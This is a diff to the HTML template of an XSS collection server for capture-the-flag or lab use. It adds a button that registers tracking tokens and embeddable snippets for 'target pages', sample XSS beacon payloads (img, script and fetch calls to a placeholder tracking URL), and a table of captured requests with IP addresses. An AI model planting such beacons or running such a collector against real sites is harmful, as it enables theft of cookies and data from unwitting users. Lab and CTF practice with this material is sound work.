@@ -2,22 +2,37 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>CTF XSS Backend</title>
+<title>CTF XSS Backend (Tracking)</title>
 <style>
 body{font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;margin:20px}
 table{border-collapse:collapse;width:100%}
 th,td{padding:8px;border:1px solid #ddd;text-align:left}
 .small{font-size:0.9em;color:#666}
+.code{font-family:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;background:#f6f8fa;padding:6px;border-radius:4px}
 </style>
 </head>
 <body>
-<h1>CTF XSS Backend</h1>
+<h1>CTF XSS Backend (Tracking)</h1>
 <p class="small">This server is intended for CTF / lab use only. Do not use it to collect real users' cookies or other sensitive information.</p>
 <p class="small">POST to <code>/submit</code> with fields: <code>source</code>, <code>data</code>, <code>note</code>. Use JSON or form-encoded requests.</p>
-<h2>Recent submissions</h2>
+
+<h2>Register a tracking endpoint</h2>
+<p class="small">Click the button to create a new tracking token and a short HTML snippet you can embed on target pages.</p>
+<button id="registerBtn">Create tracking token</button>
+<pre id="registerResult" class="code" style="display:none;margin-top:8px"></pre>
+
+<h2>Quick sample payloads</h2>
+<p class="small">Use the returned URL from register as the endpoint. Examples:</p>
+<ul>
+<li><span class="code">&lt;img src="&lt;TRACK_URL&gt;"/&gt;</span></li>
+<li><span class="code">&lt;script src="&lt;TRACK_URL&gt;&gt;&lt;/script&gt;</span> (if script responses are allowed)</li>
+<li><span class="code">fetch('&lt;TRACK_URL&gt;', {mode:'no-cors'})</span></li>
+</ul>
+
+<h2>Recent submissions / captured requests</h2>
 <table>
 <thead>
-<tr><th>ID</th><th>When</th><th>Source</th><th>Data</th><th>Note</th><th>IP</th></tr>
+<tr><th>ID</th><th>When</th><th>Source</th><th>Data / Dump</th><th>Note</th><th>IP</th></tr>
 </thead>
 <tbody>
 {{range .Submissions}}
@@ -34,5 +49,27 @@ th,td{padding:8px;border:1px solid #ddd;text-align:left}
 {{end}}
 </tbody>
 </table>
+
+<script>
+document.getElementById('registerBtn').addEventListener('click', function(){
+  var btn = this;
+  btn.disabled = true;
+  btn.textContent = 'Creating...';
+  fetch('/register', {method: 'POST'}).then(function(res){
+    return res.json();
+  }).then(function(j){
+    var el = document.getElementById('registerResult');
+    var url = (location.origin || '') + j.url;
+    el.style.display = 'block';
+    el.textContent = 'Token: ' + j.token + '\nURL: ' + url + '\n\nSnippet:\n' + j.snippet.replace(/\\n/g,'\n');
+    btn.disabled = false;
+    btn.textContent = 'Create tracking token';
+  }).catch(function(err){
+    alert('failed: '+err);
+    btn.disabled = false;
+    btn.textContent = 'Create tracking token';
+  });
+});
+</script>
 </body>
 </html>
